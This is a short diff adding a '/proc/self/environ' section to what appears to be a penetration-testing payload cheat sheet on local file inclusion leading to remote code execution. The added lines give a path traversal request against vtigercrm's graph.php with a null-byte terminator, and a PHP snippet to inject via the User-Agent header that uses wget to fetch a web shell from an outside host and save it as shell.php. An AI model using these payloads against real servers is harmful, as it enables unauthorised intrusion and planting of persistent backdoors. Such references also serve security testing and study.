@@ -582,5 +582,14 @@ It's also possible to get RCE in a vulnerable "assert" statement using the syste
 Be sure to URL-encode payloads before you send them.
 ```
 
+## /proc/self/environ
+```
+Having access to this file during LFI can lead to rce /proc/self/environ allowing us to use local variables. wget echo etc
+/vtigercrm/graph.php?current_language=../../../../../../../..//proc/self/environ%00&module=Accounts&action HTTP/1.1
+<?php('wget http://hack-bay.com/Shells/gny.txt -O shell.php');?>    <--- Put this in the user agent. 
+```
+
+
+
 
 
